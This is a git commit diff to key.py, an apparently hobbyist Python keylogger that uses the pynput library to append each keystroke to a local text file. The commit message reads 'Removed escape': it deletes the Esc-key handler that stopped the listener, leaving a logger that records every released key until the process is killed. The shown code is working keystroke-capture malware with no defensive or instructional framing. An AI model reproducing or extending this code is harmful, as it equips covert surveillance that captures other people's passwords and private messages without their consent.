f9793d0765b98cd27546b3b7986570751da6c964
CyberFowl <cyberfowlwashere@gmail.com>
2022-02-16 19:52:45 +0530

    Removed escape

--- key.py
+++ key.py
@@ -6,17 +6,10 @@ keylogger_txt.write(" ")
 keylogger_txt.close()
 keylogger_txt = open(r"C:\Users\msher\Desktop\Desktop\CyberFowl\keylogger.txt", "a")
 
-def on_press(key):
-    global key_cache, new
+def on_release(key):
     string = "{0}".format(key)
     keylogger_txt.write(f"{string}\n")
 
-def on_release(key):
-    if key == pynput.keyboard.Key.esc: #Stop Listener
-        return False    
-
 # Collect events until released
-with pynput.keyboard.Listener(
-        on_press=on_press,
-        on_release=on_release) as listener:
+with pynput.keyboard.Listener(on_release=on_release) as listener:
     listener.join()
